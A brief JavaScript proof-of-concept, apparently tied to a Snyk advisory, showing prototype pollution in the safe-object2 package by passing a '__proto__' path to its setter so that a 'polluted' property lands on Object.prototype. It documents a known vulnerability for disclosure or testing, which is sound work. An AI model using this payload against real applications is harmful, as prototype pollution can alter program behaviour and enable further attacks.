//https://snyk.io/vuln/SNYK-JS-SAFEOBJECT2-598801
  const safeObj2 = require("safe-object2/index");
  const obj = safeObj2({});

  obj.setter(["__proto__", "polluted"], "yes");
